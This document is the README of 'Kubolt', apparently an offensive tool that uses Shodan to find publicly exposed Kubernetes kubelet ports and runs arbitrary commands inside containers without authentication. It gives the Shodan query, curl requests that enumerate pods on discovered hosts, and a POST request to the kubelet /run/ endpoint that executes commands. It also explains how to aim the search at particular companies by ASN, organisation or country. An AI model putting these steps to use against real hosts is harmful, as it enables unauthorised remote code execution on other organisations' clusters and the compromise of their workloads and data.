# Wat?
**Kubolt** is simple utility for scanning public unauthinticated kubernetes clusters and run commands inside containers

# Why?
Sometimes, the kubelet port 10250 is open to unauthorized access and makes it possible to run commands inside the containers using getrun function from [kubelet](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go):
```go
// getRun handles requests to run a command inside a container.
func (s *Server) getRun(request *restful.Request, response *restful.Response) {
	params := getExecRequestParams(request)
	pod, ok := s.host.GetPodByName(params.podNamespace, params.podName)
	if !ok {
		response.WriteError(http.StatusNotFound, fmt.Errorf("pod does not exist"))
		return
	}
```

# How?
Okay, let's ask our friend Shodan :trollface:

The basic query is 
>ssl:true port:10250 404 

**Kubelet** uses port 10250 with SSL by default, 404 is the HTTP response without URL path. 

**Kubolt** asks Shodan by API for list of IP addresses and keeps them for other OSINT actions :grin:

Firstly, let's ask Kubelet for running pods and filter hosts where response doesn't contain `Unauthorized` and contains `container` so we can run command inside it. 
```bash
curl -k https://IP-from-Shodan:10250/runningpods/ 
```
Anyway, if you find the host without any running pods at the time, keep it for next time when pods might be started :grin: 

You can list all available pods from these requests:
```bash
curl -k https://IP-from-Shodan:10250/pods/
#or
curl http://IP-from-Shodan:10255/pods/ 
```

Next **kubolt** parse response and generate a new request as below:
```bash
curl -XPOST -k https://IP-from-Shodan:10250/run/<namespace>/<PodName>/<containerName> -d "cmd=<command-to-run>" 
```
You can target companies more accurate using Shodan filters such as:
- asn
- org
- country
- net

# Install 
```bash
mkdir output
pip install -r requirements.txt 
```

# Run
```python3
python kubolt.py --query "asn:123123 org:'ACME Corporation'"
#or
python kubolt.py --query "org:'ACME Corporation' country:UK"
```

# Shodan 
**Kubolt** uses Shodan API and [Query Credits](https://help.shodan.io/the-basics/credit-types-explained) accordingly, if you run the tool without query filters then you will probably fire all your credits `¯\_(ツ)_/¯`
